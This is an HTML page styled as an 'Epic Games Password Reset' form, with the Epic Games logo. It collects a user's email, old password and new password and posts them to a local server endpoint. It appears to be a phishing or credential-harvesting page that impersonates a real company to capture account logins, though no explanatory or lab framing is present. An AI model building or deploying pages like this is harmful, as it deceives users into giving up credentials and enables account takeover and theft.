<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Games Password Reset</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: #f1f1f1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 400px;
            text-align: center;
        }

        .logo img {
            width: 120px;
            margin-bottom: 20px;
        }

        h2 {
            font-weight: 500;
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
        }

        .input-field {
            width: 100%;
            padding: 12px 16px;
            margin: 10px 0;
            border-radius: 4px;
            border: 1px solid #ccc;
            font-size: 16px;
        }

        button {
            padding: 12px 30px;
            font-size: 16px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            width: 100%;
        }

        button:hover {
            background-color: #0056b3;
        }

        .loading-spinner {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }

        .success, .error {
            display: none;
            padding: 20px;
            font-size: 18px;
            color: white;
            border-radius: 8px;
            margin-top: 20px;
        }

        .success {
            background-color: #28a745;
        }

        .error {
            background-color: #dc3545;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Epic_Games_Logo.svg/1024px-Epic_Games_Logo.svg.png" alt="Epic Games Logo">
    </div>

    <h2>Reset Your Password</h2>

    <form id="resetForm">
        <input type="email" id="email" class="input-field" placeholder="Email Address" required>
        <input type="password" id="oldPassword" class="input-field" placeholder="Old Password" required>
        <input type="password" id="newPassword" class="input-field" placeholder="New Password" required>

        <button type="submit">Reset Password</button>
        <div class="loading-spinner" id="loadingSpinner"></div>
    </form>

    <div class="success" id="successMessage">
        Password reset successfully!
    </div>

    <div class="error" id="errorMessage">
        There was an error resetting the password.
    </div>
</div>

<script>
    document.getElementById('resetForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const oldPassword = document.getElementById('oldPassword').value;
        const newPassword = document.getElementById('newPassword').value;
        
        const data = { email, oldPassword, newPassword };

        // Show loading spinner
        document.getElementById('loadingSpinner').style.display = 'block';

        fetch('http://localhost:3000/reset-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            document.getElementById('loadingSpinner').style.display = 'none';
            if (data.success) {
                document.getElementById('successMessage').style.display = 'block';
                setTimeout(() => {
                    document.getElementById('successMessage').style.display = 'none';
                    // Reset form for new submission
                    document.getElementById('resetForm').reset();
                }, 3000);
            } else {
                document.getElementById('errorMessage').style.display = 'block';
                setTimeout(() => {
                    document.getElementById('errorMessage').style.display = 'none';
                }, 3000);
            }
        })
        .catch(error => {
            document.getElementById('loadingSpinner').style.display = 'none';
            document.getElementById('errorMessage').style.display = 'block';
        });
    });
</script>

</body>
</html>
